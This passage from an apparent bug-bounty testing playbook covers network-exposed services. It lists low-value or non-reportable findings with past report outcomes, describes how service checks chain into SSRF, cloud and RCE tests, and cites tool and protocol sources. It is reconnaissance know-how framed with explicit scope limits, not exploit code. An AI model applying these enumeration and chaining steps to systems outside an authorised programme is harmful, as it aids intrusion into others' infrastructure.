- **A list of open ports.** "Numerous open ports/services" (#8064), "Open port leads to information disclosure"
  (#223421) and "default open port" (#305518) carry no bounty in the index. A port is a map entry; the finding is
  what answers on it.
- **SSH, RDP, FTP or VNC that asks for a password.** Guessing it is brute force (`rate-limit`; only with
  `bruteforce-ok`). "SSH port vulnerable to brute force" (#897556) and "SSH port wide open" (#11951) were closed
  without bounty.
- **An old banner.** "Backdated" OpenSSH (#257335, $25; #255627, no bounty) is `version-disclosure` and `known-cve`
  until the advisory's own check verifies (CVE-001, CVE-002).
- **Transport and algorithms.** Weak SSH algorithms and Terrapin (#2446531), SSLv3 on mail servers (#288966), a
  missing STARTTLS: `ssl-tls`, `mitm`. A cleartext Telnet or FTP login prompt (#194454): `mitm`.
- **Amplifiers.** An open DNS resolver, NTP `monlist`, SSDP, chargen, and Memcached or CLDAP over UDP are
  denial-of-service vectors (`dos`): noted, never measured.
- **rpcbind and its CVEs.** "Open rpcbind could lead to DoS" (#791893, #235016): `dos`, `known-cve`.
- **SMTP that only talks.** `VRFY`, `EXPN` or `RCPT` user enumeration (#193314): `user-enum`. An MX accepting mail
  for its own domain, or a spoofed sender of the organisation's domain to its own users: `spf-dmarc`. SPF, DKIM and
  DMARC records themselves: `spf-dmarc`.
- **Metadata that is public by design.** The LDAP root DSE, MongoDB `buildInfo`, the CouchDB welcome banner,
  Elasticsearch `/` on a cluster that refuses everything else, an SNMPv3 engine id, ZooKeeper `srvr` alone:
  `version-disclosure`.
- **SNMP `public` with the system group only:** `version-disclosure`; with interfaces and neighbours, Low and often
  `internal-info` (#455726 carries no bounty).
- **Zone transfers of public names.** An AXFR that lists only names already in certificate transparency:
  `internal-info` (#137093 carries no bounty).
- **Internal addresses in banners and stubs.** SMTP greetings, RMI stubs and SNMP tables naming private hosts:
  `internal-info`, until a relay or an SSRF reaches them.
- **Login pages.** An internet-facing BMC, router, VPN or management login with nothing behind it is informative;
  vendor defaults are CVE-007's card.
- **IKE aggressive mode.** A VPN gateway that hands out a pre-shared-key hash to `ike-scan -A`: cracking it is out of
  bounds, and the bare observation is rated low.
- **Somebody else's address.** A service on a reissued cloud address, a shared hosting box or a CDN edge
  (`third-party`): #1456063 paid $100 because the JMX it reached was no longer Basecamp's. NET-001 first, every time.
- **Honeypots.** An address with twenty "open" databases, odd versions, or every port open: nothing to report.
- **Duplicates.** Internet-wide scanners index open Elasticsearch, MongoDB and Redis within days. On a programme
  with a published range, assume the services on common ports were reported, and mark `dup-risk` unless finding the
  service took the full port range, a UDP probe or NET-010's names.

## Chains

- NET-001 → STO-007: an in-scope name on an address that now serves another organisation.
- NET-002 → CVE-001, CVE-002: versions from `-sV`; → CVE-012: VPN and edge appliances on the range (#591295, $20,160,
  is that shape).
- NET-003 → the web chapters with `T` set to the port; CVE-007, CVE-008, INF-005, INF-008, CVE-011.
- NET-004, NET-005 ↔ SSR-009: `gopher://` and `dict://` reach the same stores on loopback.
- NET-005, NET-006 → INF-002: a credential seen in a name or a listing gets one identity call and goes to the
  operator.
- NET-006 → the upload chapter: an anonymous write into a tree the web server serves, proven with a removed marker.
- NET-007 → CVE-007: vendor default credentials on a BMC or router login; → CVE-012: BMC firmware.
- NET-008, NET-010 → NET-012, SSR-010: internal addresses and names to ask a relay or an SSRF for.
- NET-009 → CRL-007: the same relay reached through an application's mail form.
- NET-010 → STO-001, STO-007: names on third-party services and released cloud addresses.
- NET-011 → CLD-012: the full read-only test of the kubelet, the Kubernetes API, etcd and registries; → CVE-008: the
  Docker and kubelet rows; → DSR-003: an RMI registry that binds application objects.
- NET-012 → SSR-003, SSR-010: their metadata and internal-mapping limits apply unchanged; NET-012 with NET-010's
  names is #2967634's chain.

## Sources

- `kb/reports/network.md` and `kb/reports/all/network.md`; the exposed-service reports that paid are filed under
  other classes (`kb/reports/ssrf.md`, `cloud.md`, `rce.md`, `disclosure.md`, `access-control.md`); title statistics
  computed from `kb/data/index.jsonl`.
- HexBrain: `get_program_history` for the programme's earlier infrastructure reports (duplicate check),
  `get_testing_playbook` for the class.
- Nmap documentation: script categories (`default`, `safe`, `intrusive`) and the scripts used here (`ftp-anon`,
  `nfs-ls`, `nfs-showmount`, `vnc-info`, `ipmi-version`, `ipmi-cipher-zero`, `rmi-dumpregistry`).
- Product security documentation: Redis (protected mode, `requirepass`, ACLs, renamed commands); Memcached (SASL);
  ZooKeeper (four-letter-word whitelist, ACLs); MongoDB security checklist; Elasticsearch security and anonymous
  access; CouchDB 3.0 (admin-only defaults); Cassandra authenticators; Docker "Protect the Docker daemon socket";
  Kubernetes kubelet authentication and authorisation; the JPDA/JDWP specification; JMX remote monitoring
  (`com.sun.management.jmxremote.authenticate`).
- RFC 4512 (the LDAP root DSE), RFC 5321 (SMTP relaying), RFC 5936 (DNS zone transfer), RFC 8656 (TURN and peer
  address restrictions), RFC 6143 (the RFB protocol).
- Enable Security's TURN research and its `stunner` tool.
